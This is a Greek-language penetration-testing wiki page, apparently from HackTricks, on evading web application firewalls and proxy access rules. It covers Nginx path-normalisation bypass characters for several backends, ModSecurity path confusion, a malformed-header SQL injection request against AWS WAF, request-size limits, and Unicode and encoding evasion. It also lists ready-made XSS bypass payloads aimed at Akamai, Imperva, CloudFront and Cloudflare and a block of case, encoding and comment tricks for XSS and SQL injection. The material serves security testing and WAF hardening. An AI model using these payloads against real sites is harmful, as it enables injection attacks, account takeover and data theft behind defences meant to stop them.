# Proxy / WAF Protections Bypass

{{#include ../banners/hacktricks-training.md}}


## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Τεχνικές [από αυτή την έρευνα](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Παράδειγμα κανόνα Nginx:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Για να αποτραπούν οι παρακάμψεις, το Nginx εκτελεί κανονικοποίηση διαδρομής πριν από τον έλεγχο. Ωστόσο, αν ο διακομιστής backend εκτελεί διαφορετική κανονικοποίηση (αφαιρώντας χαρακτήρες που δεν αφαιρεί το nginx), μπορεί να είναι δυνατή η παράκαμψη αυτής της άμυνας.

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM configuration:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx είναι ρυθμισμένο να μπλοκάρει την πρόσβαση στο `/admin.php`, αλλά είναι δυνατόν να παρακαμφθεί αυτό με την πρόσβαση στο `/admin.php/index.php`.

### Πώς να αποτρέψετε
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**Σε αυτή την ανάρτηση**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) εξηγείται ότι το ModSecurity v3 (μέχρι 3.0.12), **υλοποιούσε εσφαλμένα τη μεταβλητή `REQUEST_FILENAME`** που προοριζόταν να περιέχει τη διαδρομή που προσπελάστηκε (μέχρι την αρχή των παραμέτρων). Αυτό συμβαίνει επειδή εκτελούσε μια αποκωδικοποίηση URL για να αποκτήσει τη διαδρομή.\
Ως εκ τούτου, ένα αίτημα όπως το `http://example.com/foo%3f';alert(1);foo=` στο mod security θα υποθέσει ότι η διαδρομή είναι απλώς `/foo` επειδή το `%3f` μετατρέπεται σε `?` που τερματίζει τη διαδρομή URL, αλλά στην πραγματικότητα η διαδρομή που θα λάβει ο διακομιστής θα είναι `/foo%3f';alert(1);foo=`.

Οι μεταβλητές `REQUEST_BASENAME` και `PATH_INFO` επηρεάστηκαν επίσης από αυτό το σφάλμα.

Κάτι παρόμοιο συνέβη στην έκδοση 2 του Mod Security που επέτρεπε την παράκαμψη μιας προστασίας που εμπόδιζε τους χρήστες να προσπελάσουν αρχεία με συγκεκριμένες επεκτάσεις σχετικές με αρχεία αντιγράφων ασφαλείας (όπως `.bak`) απλά στέλνοντας την τελεία κωδικοποιημένη σε `%2e`, για παράδειγμα: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[Αυτή η έρευνα](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) αναφέρει ότι ήταν δυνατό να παρακαμφθούν οι κανόνες AWS WAF που εφαρμόζονταν σε HTTP headers στέλνοντας έναν "κακώς σχηματισμένο" header που δεν αναλύθηκε σωστά από την AWS αλλά αναλύθηκε από τον διακομιστή backend.

Για παράδειγμα, στέλνοντας το ακόλουθο αίτημα με μια SQL injection στον header X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Ήταν δυνατόν να παρακαμφθεί το AWS WAF επειδή δεν καταλάβαινε ότι η επόμενη γραμμή είναι μέρος της τιμής της κεφαλίδας ενώ ο διακομιστής NODEJS το καταλάβαινε (αυτό διορθώθηκε).

## Γενικές παρακάμψεις WAF

### Όρια Μεγέθους Αιτήσεων

Συνήθως, τα WAF έχουν έναν συγκεκριμένο περιορισμό μήκους αιτήσεων για έλεγχο και αν μια αίτηση POST/PUT/PATCH είναι πάνω από αυτόν, το WAF δεν θα ελέγξει την αίτηση.

- Για το AWS WAF, μπορείτε να [**ελέγξετε την τεκμηρίωση**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Μέγιστο μέγεθος σώματος αίτησης ιστού που μπορεί να ελεγχθεί για προστασίες Application Load Balancer και AWS AppSync</td><td>8 KB</td></tr><tr><td>Μέγιστο μέγεθος σώματος αίτησης ιστού που μπορεί να ελεγχθεί για προστασίες CloudFront, API Gateway, Amazon Cognito, App Runner και Verified Access**</td><td>64 KB</td></tr></tbody></table>

- Από [**τα έγγραφα του Azure**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Παλαιότερα Web Application Firewalls με Core Rule Set 3.1 (ή χαμηλότερα) επιτρέπουν μηνύματα μεγαλύτερα από **128 KB** απενεργοποιώντας την επιθεώρηση σώματος αιτήσεων, αλλά αυτά τα μηνύματα δεν θα ελεγχθούν για ευπάθειες. Για νεότερες εκδόσεις (Core Rule Set 3.2 ή νεότερες), το ίδιο μπορεί να γίνει απενεργοποιώντας τον μέγιστο περιορισμό σώματος αίτησης. Όταν μια αίτηση υπερβαίνει το όριο μεγέθους:

Αν **λειτουργία πρόληψης**: Καταγράφει και μπλοκάρει την αίτηση.\
Αν **λειτουργία ανίχνευσης**: Ελέγχει μέχρι το όριο, αγνοεί το υπόλοιπο και καταγράφει αν το `Content-Length` υπερβαίνει το όριο.

- Από [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Από προεπιλογή, το WAF ελέγχει μόνο τα πρώτα 8KB μιας αίτησης. Μπορεί να αυξήσει το όριο έως 128KB προσθέτοντας Προηγμένα Μεταδεδομένα.

- Από [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Έως 128KB.

### Obfuscation <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Συμβατότητα Unicode <a href="#unicode-compatability" id="unicode-compatability"></a>

Ανάλογα με την υλοποίηση της κανονικοποίησης Unicode (περισσότερες πληροφορίες [εδώ](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), χαρακτήρες που μοιράζονται τη συμβατότητα Unicode μπορεί να είναι σε θέση να παρακάμψουν το WAF και να εκτελούνται ως το προοριζόμενο payload. Συμβατοί χαρακτήρες μπορούν να βρεθούν [εδώ](https://www.compart.com/en/unicode).

#### Παράδειγμα <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Bypass Contextual WAFs with encodings <a href="#ip-rotation" id="ip-rotation"></a>

Όπως αναφέρεται σε [**αυτή την ανάρτηση στο blog**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), προκειμένου να παρακάμψουμε WAFs που είναι ικανοί να διατηρούν ένα πλαίσιο της εισόδου του χρήστη, θα μπορούσαμε να εκμεταλλευτούμε τις τεχνικές WAF για να κανονικοποιήσουμε την είσοδο των χρηστών.

Για παράδειγμα, στην ανάρτηση αναφέρεται ότι **η Akamai αποκωδικοποίησε μια είσοδο χρήστη 10 φορές**. Επομένως, κάτι όπως `<input/%2525252525252525253e/onfocus` θα θεωρηθεί από την Akamai ως `<input/>/onfocus` το οποίο **μπορεί να νομίζει ότι είναι εντάξει καθώς η ετικέτα είναι κλειστή**. Ωστόσο, όσο η εφαρμογή δεν αποκωδικοποιεί την είσοδο 10 φορές, το θύμα θα δει κάτι όπως `<input/%25252525252525253e/onfocus` το οποίο είναι **ακόμα έγκυρο για μια επίθεση XSS**.

Επομένως, αυτό επιτρέπει να **κρύβουμε payloads σε κωδικοποιημένα στοιχεία** που θα αποκωδικοποιήσει και θα ερμηνεύσει το WAF ενώ το θύμα δεν θα το κάνει.

Επιπλέον, αυτό μπορεί να γίνει όχι μόνο με URL κωδικοποιημένα payloads αλλά και με άλλες κωδικοποιήσεις όπως unicode, hex, octal...

Στην ανάρτηση προτείνονται οι εξής τελικές παρακάμψεις:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Αναφέρεται επίσης ότι ανάλογα με **το πώς ορισμένα WAFs κατανοούν το πλαίσιο** της εισόδου του χρήστη, μπορεί να είναι δυνατό να το εκμεταλλευτούμε. Το προτεινόμενο παράδειγμα στο blog είναι ότι η Akamai επιτρέπει να βάλουμε οτιδήποτε μεταξύ `/*` και `*/` (πιθανώς επειδή αυτό χρησιμοποιείται συνήθως ως σχόλια). Επομένως, μια SQL injection όπως `/*'or sleep(5)-- -*/` δεν θα ανιχνευθεί και θα είναι έγκυρη καθώς το `/*` είναι η αρχική συμβολοσειρά της ένεσης και το `*/` είναι σχόλιο.

Αυτού του είδους τα προβλήματα πλαισίου μπορούν επίσης να χρησιμοποιηθούν για **να εκμεταλλευτούν άλλες ευπάθειες από αυτές που αναμένονται** να εκμεταλλευτούν από το WAF (π.χ. αυτό θα μπορούσε επίσης να χρησιμοποιηθεί για να εκμεταλλευτεί μια XSS).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Δημιουργία ενός URL API gateway για χρήση με ffuf
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Παρόμοιο με το fireprox
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Πρόσθετο Burp Suite που χρησιμοποιεί IPs API gateway
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Ένας δυναμικά καθορισμένος αριθμός περιπτώσεων κοντέινερ ενεργοποιείται με βάση το μέγεθος του αρχείου εισόδου και τον παράγοντα διαχωρισμού, με την είσοδο να διαχωρίζεται σε κομμάτια για παράλληλη εκτέλεση, όπως 100 περιπτώσεις που επεξεργάζονται 100 κομμάτια από ένα αρχείο εισόδου 10,000 γραμμών με παράγοντα διαχωρισμού 100 γραμμών.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Διαφορετικές τεχνικές μπορούν να χρησιμοποιηθούν για να παρακάμψουν τα φίλτρα regex στα τείχη προστασίας. Παραδείγματα περιλαμβάνουν εναλλαγή πεζών και κεφαλαίων, προσθήκη διαλειμμάτων γραμμής και κωδικοποίηση payloads. Πόροι για τις διάφορες παρακάμψεις μπορούν να βρεθούν στο [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) και [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Τα παραδείγματα παρακάτω προήλθαν από [αυτό το άρθρο](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Εργαλεία

- [**nowafpls**](https://github.com/assetnote/nowafpls): Πρόσθετο του Burp για την προσθήκη άχρηστων δεδομένων σε αιτήματα για την παράκαμψη των WAF με βάση το μήκος

## Αναφορές

- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)


{{#include ../banners/hacktricks-training.md}}
